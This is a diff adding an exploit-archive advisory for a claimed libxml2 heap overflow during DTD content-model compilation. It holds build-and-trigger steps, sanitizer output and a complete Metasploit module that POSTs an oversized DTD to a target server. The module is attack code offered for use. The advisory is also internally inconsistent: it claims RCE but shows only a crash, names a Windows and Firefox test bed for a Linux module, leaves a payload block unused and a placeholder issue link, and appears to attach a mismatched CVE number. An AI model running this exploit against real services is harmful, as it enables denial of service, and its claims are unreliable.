@@ -1,0 +1,169 @@
+=============================================================================================================================================
+| # Title     : libxml2 2.9.14 (2022) RCE                                                                                                   |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.1 (64 bits)                                                            |
+| # Vendor    : https://gitlab.gnome.org/GNOME/libxml2                                                                                      |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/207181/ &  CVE-2024-25062
+
+[+] Summary : 
+             
+           A heap buffer overflow vulnerability exists in the xmlRegEpxFromParse function within xmlregexp.c. 
+		   The issue occurs during the compilation of regular expressions for DTD validation when processing content models with excessive elements.
+
+[+] Root Cause Analysis :
+
+// Vulnerable code in xmlRegEpxFromParse
+transitions = xmlRegCalloc2(nbstates + 1, nbatoms + 1, sizeof(int));
+
+for (i = 0; i < ret->nbStates; i++) {
+    for (j = 0; j < state->nbTrans; j++) {
+        // INTEGER OVERFLOW OCCURS HERE
+        prev = transitions[stateno * (nbatoms + 1) + atomno + 1];
+        transitions[stateno * (nbatoms + 1) + atomno + 1] = targetno + 1;
+    }
+}
+
+[+] Vulnerability Mechanism :
+
+    Large DTD Input    : Content model with ≥46,341 elements
+    64-bit Allocation  : Successful allocation of 2GB+ memory block
+    32-bit Indexing    : Integer overflow in index calculation
+    Negative Indices   : Array access with large negative offsets
+    Heap Corruption    : Out-of-bounds read/write operations
+
+[+] Impact Assessment : Confirmed Impacts
+
+    Denial of Service       : Segmentation fault and application crash
+    Memory Corruption       : Heap structure damage
+    Information Disclosure  : Potential memory content leakage
+
+[+] Potential Impacts (Theoretical)
+
+    Remote Code Execution     : Under specific conditions
+    Privilege Escalation      : In setuid binaries or services
+    Arbitrary Code Execution  : With additional exploitation techniques
+
+[+] Proof of Concept
+
+# 1. Build vulnerable libxml2
+CFLAGS="-fsanitize=address -g" ./configure && make
+
+# 2. Generate malicious XML
+python3 poc.py
+
+# 3. Trigger vulnerability
+./xmllint --valid poc_46341.xml
+
+[+] PoC Output
+
+==ERROR: AddressSanitizer: heap-buffer-overflow
+READ of size 4 at 0x60b000000110 thread T0
+    #0 in xmlRegEpxFromParse (xmlregexp.c:657)
+
+[+] Affected Systems :
+
+    Applications  : Any software using libxml2 for DTD validation
+    Services      : XML-RPC, SOAP, document processing services
+    Tools         : xmllint, XML parsers in various languages
+
+[+] Common Integration Points :
+
+    Web browsers with XML support
+    Office document processors
+    Development tools and IDEs
+    Network services processing XML
+
+			 
+[+] POC :
+
+##
+# Metasploit module for libxml2 RCE attempt
+##
+
+require 'msf/core'
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = NormalRanking
+
+  include Msf::Exploit::Remote::HttpClient
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'libxml2 Heap Overflow RCE',
+      'Description'    => %q{
+        Attempts to exploit libxml2 integer overflow for RCE
+        through malicious DTD processing
+      },
+      'Author'         => ['indoushka'],
+      'License'        => MSF_LICENSE,
+      'References'     => [
+        ['CVE', 'CVE-2024-25062'],
+        ['URL', 'https://gitlab.gnome.org/GNOME/libxml2/-/issues/XXX']
+      ],
+      'DefaultOptions' => {
+        'SSL' => false,
+        'RPORT' => 80
+      },
+      'Platform'       => 'linux',
+      'Arch'           => ARCH_X86,
+      'Payload'        => {
+        'Space'    => 1024,
+        'BadChars' => "\x00\x0a\x0d\x22\x27",
+        'StackAdjustment' => -3500,
+      },
+      'Targets'        => [
+        ['Automatic', {}],
+        ['Linux x86', { 'Arch' => ARCH_X86 }],
+        ['Linux x64', { 'Arch' => ARCH_X64 }]
+      ],
+      'DisclosureDate' => '2024-01-01',
+      'DefaultTarget'  => 0))
+  end
+
+  def create_malicious_xml
+    num_elements = 46341
+    elements = (0...num_elements).map { |i| "el#{i}" }
+    content_model = elements.join(',')
+
+    xml = %Q{
+<?xml version="1.0"?>
+<!DOCTYPE root [
+<!ELEMENT root (#{content_model})>
+#{elements.map { |el| "<!ELEMENT #{el} EMPTY>" }.join("\n")}
+]>
+<root/>
+}
+
+    return xml
+  end
+
+  def exploit
+    print_status("Generating malicious XML payload...")
+    
+    malicious_xml = create_malicious_xml
+    
+    print_status("Sending exploit to target...")
+    
+    # Send as multipart/form-data or in POST body
+    res = send_request_cgi({
+      'method'    => 'POST',
+      'uri'       => normalize_uri(target_uri.path),
+      'ctype'     => 'application/xml',
+      'data'      => malicious_xml
+    }, 25)
+    
+    if res && res.code == 200
+      print_status("Target responded - checking for code execution...")
+    else
+      print_status("No response - target may have crashed")
+    end
+    
+    handler
+  end
+end
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
